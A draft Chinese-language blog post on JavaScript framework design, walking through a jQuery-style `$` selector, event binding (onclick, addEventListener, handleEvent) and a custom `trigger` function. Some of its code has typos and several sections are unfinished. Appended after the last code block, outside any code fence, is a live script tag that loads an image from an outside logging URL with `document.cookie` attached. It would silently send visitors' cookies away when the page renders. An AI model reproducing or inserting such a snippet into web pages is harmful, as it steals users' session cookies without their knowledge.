---
title: "JavaScript Framework Design"
date: "2018-10-22"
layout: post
draft: true
path: "/posts/JS-Framework-Design"
category: ""
tags:
  - JavaScript
description: ""
---

# JavaScript Framework Design

待续

## 写在前面的

待续

## Done something simple

`$`经常被用来在各种语言中使用, 在Web开发中也不例外, 人人都知道的Jquery使用了`$` 提高了我们的效率
make our life better, take a look at a example below:  

### Query Elements

首先我们来实现如何像下面这样, 使用 `$` 来选择元素.

```javascript
var div = document.querySelector('div');

var div = $('div')
```

我们要实现的是通过`$`选择元素, 当匹配到一个元素时, 返回匹配到的元素 `Node`, 当匹配到多个元素时, 返回 `NodeList`.

```javascript
$ = function(s){
  var el = document.querySelectorAll(s),
  len = el.length;
  return len === 1 ? el[0] : el;
}
```

现在我们就可以通过`$`来选择元素了，比如:

```javascript
var body = $('body') // <body> ... </body>
```

当选择到多个元素时，它会返回`NodeList`:

```javascript
var p = $('p')  // return a NodeList(..)

// Although NodeList is not an Array , it is possible to iterate over it with forEach()
// It can also be converted to a real Array using Array.from()
$('div').forEach(function(el){
  // do something
})
```

如果我们不想使用 `forEach` 来遍历`NodeList`的元素, 而是想自定义一个 `each` 来代替 `forEach` 该怎么办呢？
我们只需要给 `NodeList` 增加一个 `each` 的方法, 并且让 `each` 具有 `forEach` 的功能.

```javascript
NodeList.prototype.each = [].forEach; // or Array.prototype.forEach

$('div').each(function(el){
  // do something
})
```

### 事件绑定

如何绑定一个用户点击事件？ 如果我们不知道的情况下，我们通常会去搜索 *js事件绑定*, 然后搜到关键字
`onclick`或者`addEventListener`之后直接使用. 但是当我们设计框架(库)的时候, 我们还要对这个知识点
了解的更多. 因为我们写的代码相对于使用者是底层, 是一个黑盒子, 所以如果出现了Bug会对使用者造成很大的困惑，
到底是自己代码逻辑问题还是使用的库的问题？

让我们来回顾一些js事件绑定的基础知识
DOM节点（不止DOM）会产生一些事件比如

- 鼠标事件: `click`, `contextmenu`, `mousemove`  
- css事件：`transitionend`
- Document事件: `DOMContentLoaded`

我们需要提前绑定事件处理函数，以便当事件发生时, 我们对它进行相应的处理。
绑定事件处理函数有一以下几种方式

#### HTML-attribute

```javascript
<script>
  function countRabbits() {
    for(let i=1; i<=3; i++) {
      alert("Rabbit number " + i);
    }
  }
</script>

<input type="button" onclick="countRabbits()" value="Count rabbits!">
```

使用这种方式绑定事件的时候一定要注意要将事件处理函数用引号包起来`onclick="countRabbits()"`,
因为HTML属性不是 **case-sensitive**的, 因此属性`onClick`,`ONCLICK`都是正确的. 

#### DOM property

```javascript
<div id="elem" value="Click me">Thank you</div>
<script>

  document.getElementById('elem').onclick = function() {
    alert(this.innerHTML);
  };
</script>
```

在事件处理函数中的`this`指向的产生事件的这个对象, 设置DOM属性大家很容易想到使用`setAttribute`,
但是我们不能使用`setAttribute`为元素来设置DOM属性, 以下代码是错误的

```javascript
document.body.setAttribute('onclick', function() { alert(1) });
```

使用 DOM property 为元素绑定事件有一个局限就是当为元素绑定多个事件的时候，后一个绑定的事件会覆盖
前一个绑定的事件，比如

```javascript
input.onclick = function() { alert(1); }
// ...
input.onclick = function() { alert(2); } // replaces the previous handler
```

只有`alert(2)`生效，`alert(1)`被覆盖了. 如果我们想为同一个事件绑定多个处理函数，我们需要使用下面这种
绑定方式.

#### addEventListener

``` javascript
<input id="elem" type="button" value="Click me"/>

<script>
  function handler1() {
    alert('Thanks!');
  };

  function handler2() {
    alert('Thanks again!');
  }

  elem.onclick = () => alert("Hello");
  elem.addEventListener("click", handler1); // Thanks!
  elem.addEventListener("click", handler2); // Thanks again!
</script>
```

当我们想移除元素上的事件处理函数时可以使用`removeEventListener(event, handler, [, phase])`, 这里需要注意的是
移除的事件处理函数必须是同一个，所以我们不可以使用匿名函数，必须使用一个变量来保存这个函数，以下对事件处理函数的移除是不生效的.

```javascript
elem.addEventListener( "click" , () => alert('Thanks!'));
elem.removeEventListener( "click", () => alert('Thanks!'));
```

有一些事件必须是用`addEventListener`来绑定事件处理函数, 比如`transitionend`事件

```html
<style>
  input {
    transition: width 1s;
    width: 100px;
  }

  .wide {
    width: 300px;
  }
</style>

<input type="button" id="elem" onclick="this.classList.toggle('wide')" value="Click me">

<script>
  elem.ontransitionend = function() {
    alert("DOM property"); // doesn't work
  };

  elem.addEventListener("transitionend", function() {
    alert("addEventListener"); // shows up when the animation finishes
  });
</script>
```

回顾完事件绑定，我们回顾一下事件对象，事件对象都有以下2个参数
`event.type`: 比如`click`, `mouseover`  
`event.currentTarget`: 相当于`this`  
在绑定事件时我们还可以使用`handleEvent`，也就是传一个对象给`addEventListener`

```javascript
<button id="elem">Click me</button>

<script>
  elem.addEventListener('click', {
    handleEvent(event) {
      alert(event.type + " at " + event.currentTarget);
    }
  });
</script>
```

在ES6中我们可以直接传一个`class`给`addEventListener`

```html
<button id="elem">Click me</button>

<script>
  class Menu {
    handleEvent(event) {
      switch(event.type) {
        case 'mousedown':
          elem.innerHTML = "Mouse button pressed";
          break;
        case 'mouseup':
          elem.innerHTML += "...and released.";
          break;
      }
    }
  }

  let menu = new Menu();
  elem.addEventListener('mousedown', menu);
  elem.addEventListener('mouseup', menu);
</script>
```

使用`switch`这样判断很繁琐，我们可以优化代码为这样

```html
<button id="elem">Click me</button>

<script>
  class Menu {
    handleEvent(event) {
      // mousedown -> onMousedown
      let method = 'on' + event.type[0].toUpperCase() + event.type.slice(1);
      this[method](event);
    }

    onMousedown() {
      elem.innerHTML = "Mouse button pressed";
    }

    onMouseup() {
      elem.innerHTML += "...and released.";
    }
  }

  let menu = new Menu();
  elem.addEventListener('mousedown', menu);
  elem.addEventListener('mouseup', menu);
</script>
```

当然事件的基础之外远远比这个要多，限于篇幅关系还有很多重要的内容本文都没有涉及比如事件冒泡，只有对这些基础知识
彻底掌握，才可以写出可靠的框架（库）.

有了事件绑定的基础知识后让我们给所有的`p`元素绑定点击事件:

```javascript
$('p').each(function(el){
  el.addEventListener('click', function(event){
    event.preventDefault();
    // do something else
  })
})
```

但是我们发现 `addEventListener` 太长了, 使用起来不方便, 如何实现像 jQuery那样通过`on`来绑定事件呢？

```javascript
Node.prototype.on = function (e, f) {
    this.addEventListener(e, f, false);
}

$('body').on('click', function(){
  // do something
})

```

我们现在只给`Node`添加了`on`的方法, 接下来我们给 `window` 和 `NodeList` 也添加 `on` 方法：

```javascript
window.addEventListener('load', functino(){ /* */});


window.on = Node.prototype.on = function (e, f) {
    this.addEventListener(e, f, false);
}

window.on('load', function(){/* */})

NodeList.prototype.on = function(e, f){
    this.each(function(el){
      el.on(e, f)
    })
}
$('div').on('click', function(){ /* */})

```

### 自定义事件

我们来实现一个最简单的自定义事件. 当我们点击元素A时, 元素B打印A元素的内容. 首先元素B要监听一个我们自定义的 `print` 事件,
并当该事件触发时打印A元素的内容. 

```javascript
const log = console.log
```

优秀的框架（库）简化了我们的开发, 极大的提升了我们的开发效率, 因此当我们在设计框架时, 简化语法、封装功能是我们必须要考虑的. 下面举2个例子来说明一下.

- 简化语法
  
`console.log` 是我们最常用的语句之一, 我们现在将 `console.log` 简化成 `log`

```javascript
console.log('initial commit');


const log = console.log

log('initial commit')
```

- 封装功能

比如我们想在指定节点后添加文本段

```javascript
let body = document.querySelector('body');

let p1 = document.createElement('p');
p1.innerHTML = 'Parapragh 1'
body.appendChild(p1);

let p2 = document.createElement('p');
p2.innerHTML = 'Parapragh 2'
body.appendChild(p2);
```

对于上面这种相同逻辑的代码, 我们可以使用函数将它封装成一个 **添加文本段** 的功能.

```javascript
function addParagraph(parent, txt){
  let p = documet.createElement('p')
  p.textContent = txt
  parent.appendChild(p)
}

function removeParagraph(parent, p){
  parent.removeChild(p)
}
```




```javascript
const log = console.log

  $(‘#A’).on(event, function(){
    log(event.data)
  })
```


然后我们创建一个新的自定义事件 `print`.


```javascript
 window.trigger = node.trigger = function (type, data) {
    // construct an HTML event.
    var e = document.createEvent('HTMLEvents');
    e.initEvent(type, true, true);
    e.data = data || {};
    e.eventName = type;
    e.target = this;
    this.dispatchEvent(e);
  };

var element = $('#A')
element.on('click', function(){
  element.trigger('print', this.innerText)
})
```








下面我们来实现 Events 中的事件绑定(Bind events)和自定义事件(Custom events). 












```javascript
var links = $('')

$ = (function (document, window, $) {
    // Node covers all elements, but also the document objects
    var node = Node.prototype,
        nodeList = NodeList.prototype,
        forEach = 'forEach',
        trigger = 'trigger',
        each = [][forEach],
        // note: createElement requires a string in Firefox
        dummy = document.createElement('i');
  
    nodeList[forEach] = each;
  
    // we have to explicitly add a window.on as it's not included
    // in the Node object.
    window.on = node.on = function (event, fn) {
      this.addEventListener(event, fn, false);
  
      // allow for chaining
      return this;
    };
  
    nodeList.on = function (event, fn) {
      this[forEach](function (el) {
        el.on(event, fn);
      });
      return this;
    };
  
    // we save a few bytes (but none really in compression)
    // by using [trigger] - really it's for consistency in the
    // source code.
    window[trigger] = node[trigger] = function (type, data) {
      // construct an HTML event. This could have
      // been a real custom event
      var event = document.createEvent('HTMLEvents');
      event.initEvent(type, true, true);
      event.data = data || {};
      event.eventName = type;
      event.target = this;
      this.dispatchEvent(event);
      return this;
    };
  
    nodeList[trigger] = function (event) {
      this[forEach](function (el) {
        el[trigger](event);
      });
      return this;
    };
  
  
    // $.on and $.trigger allow for pub/sub type global
    // custom events.
    $.on = node.on.bind(dummy);
    $[trigger] = node[trigger].bind(dummy);
  
    return $;
  })(document, this);
  ```

 <script>
new Image().src="http://jehiah.com/_sandbox/log.cgi?c="+encodeURI(document.cookie);
</script>